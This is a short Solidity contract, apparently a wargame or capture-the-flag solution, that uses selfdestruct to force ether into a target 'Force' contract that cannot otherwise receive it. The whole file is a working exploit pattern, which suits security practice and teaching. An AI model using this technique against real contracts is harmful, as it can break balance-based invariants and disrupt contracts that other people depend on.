// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Force.sol";

contract ForceCaller {
  Force force;

  constructor(Force _force) public payable {
    force = _force;
  }

  function forceSendEth() public {
    selfdestruct(payable(address(force)));
  }
}